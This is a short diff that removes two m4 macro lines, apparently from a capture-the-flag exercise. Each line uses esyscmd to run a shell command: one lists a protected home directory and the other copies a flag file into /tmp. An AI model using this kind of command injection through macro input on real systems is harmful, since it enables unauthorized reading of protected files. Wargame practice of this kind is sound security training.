@@ -1,2 +1,0 @@
-esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
-esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
